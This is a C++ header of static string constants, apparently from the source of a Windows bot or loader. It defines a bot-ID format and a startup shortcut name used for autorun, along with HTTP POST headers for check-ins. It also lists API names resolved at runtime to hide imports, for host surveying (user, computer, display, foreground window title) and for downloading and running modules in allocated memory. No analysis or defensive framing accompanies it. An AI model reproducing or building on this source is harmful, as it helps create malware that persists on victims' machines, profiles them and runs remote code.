#pragma once
#define MAX_MODULE_SIZE 5*1024*1024

namespace StaticData
{
	static wchar_t botidFmt[] = L"%08lX%04lX%lu";
	static wchar_t autorunLnkName[] = L"\\cmd.lnk";
	static wchar_t post[] = L"POST";
	static wchar_t headers[] = L"Content-Type: application/x-www-form-urlencoded";
	static wchar_t screenResFmt[] = L"%dx%d";
	static wchar_t unableGet[] = L"unable get";
	static char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	static const size_t alphabetSize = sizeof(alphabet) - 1;

	// DLL names
	static char Kernel32dll[] = "Kernel32.dll";
	static char User32dll[] = "User32.dll";
	static char Shell32dll[] = "Shell32.dll";
	static char Ole32dll[] = "Ole32.dll";
	static char Wininetdll[] = "Wininet.dll";
	static char Advapi32dll[] = "Advapi32.dll";
	
	static char GetFileAttributesW[] = "GetFileAttributesW";
	static char GetWindowsDirectoryW[] = "GetWindowsDirectoryW";
	static char GetVolumeInformationW[] = "GetVolumeInformationW";
	static char wsprintfW[] = "wsprintfW";
	static char HeapAlloc[] = "HeapAlloc";
	static char HeapFree[] = "HeapFree";
	static char SHGetFolderPathW[] = "SHGetFolderPathW";
	static char lstrcatW[] = "lstrcatW";
	static char CreateDirectoryW[] = "CreateDirectoryW";
	static char CreateFileW[] = "CreateFileW";
	static char GetFileSize[] = "GetFileSize";
	static char CloseHandle[] = "CloseHandle";
	static char ReadFile[] = "ReadFile";
	static char WriteFile[] = "WriteFile";
	static char GetModuleFileNameW[] = "GetModuleFileNameW";
	static char CoInitialize[] = "CoInitialize";
	static char CoCreateInstance[] = "CoCreateInstance";
	static char CoUninitialize[] = "CoUninitialize";
	static char ShellExecuteW[] = "ShellExecuteW";
	static char ExitProcess[] = "ExitProcess";
	static char CreateMutexW[] = "CreateMutexW";
	static char GetLastError[] = "GetLastError";
	static char GetUserDefaultLangID[] = "GetUserDefaultLangID";
	static char lstrcmpW[] = "lstrcmpW";
	static char ReleaseMutex[] = "ReleaseMutex";
	static char Sleep[] = "Sleep";
	static char MultiByteToWideChar[] = "MultiByteToWideChar";
	static char WideCharToMultiByte[] = "WideCharToMultiByte";
	static char lstrlenA[] = "lstrlenA";
	static char lstrlenW[] = "lstrlenW";
	static char InternetOpenW[] = "InternetOpenW";
	static char InternetConnectW[] = "InternetConnectW";
	static char HttpOpenRequestW[] = "HttpOpenRequestW";
	static char InternetCloseHandle[] = "InternetCloseHandle";
	static char HttpSendRequestW[] = "HttpSendRequestW";
	static char InternetReadFile[] = "InternetReadFile";
	static char IsWow64Process[] = "IsWow64Process";
	static char GetUserNameW[] = "GetUserNameW";
	static char GetComputerNameW[] = "GetComputerNameW";
	static char EnumDisplayDevicesW[] = "EnumDisplayDevicesW";
	static char GlobalMemoryStatusEx[] = "GlobalMemoryStatusEx";
	static char GetDesktopWindow[] = "GetDesktopWindow";
	static char GetWindowRect[] = "GetWindowRect";
	static char GetForegroundWindow[] = "GetForegroundWindow";
	static char GetWindowTextW[] = "GetWindowTextW";
	static char GetTickCount[] = "GetTickCount";
	static char ShellExecuteA[] = "ShellExecuteA";
	static char GetModuleHandleA[] = "GetModuleHandleA";
	static char GetProcAddress[] = "GetProcAddress";
	static char	LoadLibraryA[] = "LoadLibraryA";
	static char	VirtualAlloc[] = "VirtualAlloc";
	static char	VirtualFree[] = "VirtualFree";
	static char	CreateThread[] = "CreateThread";
}